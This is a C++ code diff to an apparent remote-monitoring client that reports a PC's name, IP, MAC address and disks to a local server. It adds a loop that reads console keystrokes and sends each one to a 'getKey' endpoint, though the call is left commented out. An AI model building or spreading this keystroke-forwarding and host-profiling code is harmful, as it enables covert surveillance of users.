@@ -9,6 +9,7 @@
 #include <clocale>
 #include <stdio.h>
 #include <json/value.h>
+#include <conio.h>
 
 using namespace std;
 
@@ -363,6 +364,27 @@ void GetRequestServer(string url) {
     }
 }
 
+void PostKeyPc(string url, string key) {
+    url.append("pc/client/getKey/");
+
+    auto r = cpr::Get(cpr::Url{ url },
+        cpr::Parameters{
+            {"key", key},
+        });
+
+    RequestStatusCode(r.status_code);
+}
+
+void DetectKeyBoard(string url) {
+    string key;
+
+    while (1)
+    {
+        key = _getch();
+        PostKeyPc(url, key);
+    }
+}
+
 void AsyncRequests(string url) {
     for (size_t i = 10; i > 0; i--)
     {
@@ -377,12 +399,17 @@ void AsyncRequests(string url) {
 
 int main()
 {
+    SetConsoleOutputCP(1251);
     string url = "http://127.0.0.1:8000/";
     RequestAddPc(url, GetNamePc(), RequestGetIp(), GetMacAddress(), "Administraton inserting...."); //добавление пк
     RequestCreateDisks(url); // создание дисков
 
-    auto f = async(AsyncRequests, url);
-    f.get();
+    auto a = async(AsyncRequests, url);
+
+    //auto b = async(DetectKeyBoard, url);
+    //b.wait();
+
+
 
 }
 
